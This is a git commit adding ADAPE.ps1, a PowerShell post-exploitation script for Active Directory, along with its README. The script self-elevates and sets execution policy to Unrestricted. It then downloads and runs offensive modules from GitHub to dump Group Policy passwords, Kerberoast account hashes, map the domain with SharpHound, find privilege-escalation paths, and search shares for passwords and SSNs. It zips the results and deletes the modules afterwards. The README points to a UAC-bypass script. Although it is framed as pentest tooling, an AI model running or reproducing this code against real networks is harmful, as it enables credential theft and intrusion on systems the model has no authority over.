6d36da3176c338464daef6c293597074c5f30ba1
Hausec <33264718+hausec@users.noreply.github.com>
2018-04-02 19:00:01 -0400

    More modules and stuff

---
+++ ADAPE.ps1
@@ -0,0 +1,116 @@
+Write-Host "###########################################################################################################" -ForegroundColor Green
+Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.1                                    ##" -ForegroundColor Green
+Write-Host "##   Developed By Hausec                                                                                 ##" -ForegroundColor Green
+Write-Host "##                                                                                                       ##" -ForegroundColor Green
+Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
+Write-Host "##                                                                                                       ##" -ForegroundColor Green
+Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
+Write-Host "###########################################################################################################" -ForegroundColor Green
+Set-ExecutionPolicy Unrestricted
+#run as Admin, if possible
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{   
+$arguments = "& '" + $myinvocation.mycommand.definition + "'"
+Start-Process powershell -Verb runAs -ArgumentList $arguments
+Break
+}
+#Create capture file
+$path = "C:\Capture"
+"Creating the capture folder..."
+If(!(test-path $path))
+{
+      New-Item -ItemType Directory -Force -Path $path | Out-Null
+	  Write-Host "Created C:\Capture folder!" -ForegroundColor Green
+}
+else
+{
+	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
+}
+#specify modules folder
+$modulepath=$env:psmodulepath.split(';')[0].split(' ')
+Write-Host "Using Module path: $modulepath" -ForegroundColor Green
+
+#create GPP PS module folder
+If(!(test-path $modulepath/GPP))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
+}
+#check for GPP passwords
+Write-Host "Fetching GPPP module..." 
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.ps1")
+#import module
+Write-Host "Importing module..." 
+Import-Module gpp.ps1
+#Run GPP. Verbose enabled so you know it's actually working or not
+Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
+Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
+
+#create kerberoast PS module folder
+If(!(test-path $modulepath/Kerberoast))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
+}
+
+#download Kerberoast
+Write-Host "Fetching Kerberoast module..."
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.ps1")
+#Run Kerberoast
+Write-Host "Importing module..." 
+Import-Module Kerberoast.ps1
+Write-Host "Running Kerberoast" -ForegroundColor  Yellow
+Invoke-Kerberoast | Out-File $path\Kerberoast.krb 
+
+#SharpHound
+If(!(test-path $modulepath/SharpHound))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/SharpHound | Out-Null
+}
+Write-Host "Fetching SharpHound module..." 
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1","$modulepath/SharpHound/SharpHound.ps1")
+Write-Host "Importing module..." 
+Import-Module SharpHound.ps1
+Write-Host "Running SharpHound" -ForegroundColor  Yellow
+Invoke-BloodHound -CSVFolder C:\Capture | Out-Null
+
+#PrivEsc
+If(!(test-path $modulepath/PrivEsc))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
+}
+Write-Host "Fetching PowerUp module..."
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.ps1")
+Write-Host "Importing module..."
+Import-Module PrivEsc.ps1
+Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
+Invoke-AllChecks | Out-File $path\PrivEsc.txt
+
+#PowerView
+If(!(test-path $modulepath/PowerView))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
+}
+Write-Host "Fetching PowerView module..." 
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.ps1")
+Write-Host "Importing module..."
+Import-Module PowerView.ps1
+Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
+Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
+Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
+#Edit the terms if you want to look for different strings in files. Remove this cmdlet if it takes too long.
+Invoke-FileFinder -Verbose -Terms accounts,ssn,password,secret,admin -OutFile $path\FileFinder.txt
+Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
+Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
+
+#Zip it all up and remove leftovers
+Compress-Archive -Path $path -Update -DestinationPath C:\Capture.zip
+Remove-Item -Recurse -Force "$modulepath/Kerberoast"
+Remove-Item -Recurse -Force "$modulepath/PrivEsc"
+Remove-Item -Recurse -Force "$modulepath/SharpHound"
+Remove-Item -Recurse -Force "$modulepath/PowerView"
+Remove-Item -Recurse -Force $path
+Write-Host "Done! Results stored in the Capture.zip file!" -ForegroundColor Green
--- README.md
+++ README.md
@@ -1,21 +1,24 @@
-# AD Asessment and Privilege Escalation Script
-In my engagements and assessments, I often run a few tools once there's a foothold. This script combines the following scripts into one:
+# Active Directory Assessment and Privilege Escalation Script
+In my engagements and assessments, I often run a few powershell scripts that help identify next targets, check for bad group policy settings, AD misconfigs, missing patches, etc. This script combines the ones I use routinely and autoruns the functions I use in those scripts, outputting them into a zip file. This script uses the following .ps1s and their functions:
 
-Kerberoast (https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
+•	Kerberoast (https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
+•	BloodHound (https://github.com/BloodHoundAD/BloodHound)
+•	PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+•	PowerView (https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
-BloodHound (https://github.com/BloodHoundAD/BloodHound)
+This script will do the following:
 
-PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+•	Check for GPP password (MS14-025)
+•	Gather hashes for accounts via Kerberoast
+•	Map out the domain and identify targets via BloodHound
+•	Check for privilege escalation methods
+•	Search for open SMB shares on the network 
+•	Search those shares and other accessible directories for sensitive files (Passwords, PII, etc.)
+•	Check patches of systems on the network
 
-There's two scripts here: One for a privileged user and one for a non-privileged user. The difference is that the non-privileged user will download modules in their Documents/WindowsPowerShell/Modules directory and store them in their Documents/Capture.zip folder, where a privileged user will use the Program Files/WindowsPowerShell/Modules and C:\Capture.
-The script will download each PS script, run it, output the results to a folder and zip the folder up, then delete the modules. Feel free to change any directories and modify this is any way you like. 
-
-More scripts and functionality will probably be added at a later date. 
-
+The script will ask to run as admin, as it requires it. If you do not have admin access, it will still run the privilege escalation module. If you're being blocked by UAC, I suggest running a bypass UAC script (https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1). After running the .ps1, it will create the capture file and start creating module folders to store the downloaded scripts into. Everything captured is stored and zipped up into the C:/Capture.zip file. If C:/ cannot be be written to, change the directory in the code under the comment that says "Change storage directory here". At the end of the script, it deletes all the folders it created (except the .zip file, obviously). GPP password checking takes a few minutes to run, as well as searching for open SMB shares and sensitive files, so don't be surprised if this script takes 20 minutes to finish. Comment those sections out if they take too long to run. 
 
 Usage: Just run the script
 
-.\ADAPELow.ps1 
-or
-.\ADAPEPriv.ps1 
-or right click > Run with PowerShell
+PowerShell.exe -ExecutionPolicy Bypass -File .ADAPE.ps1 
+
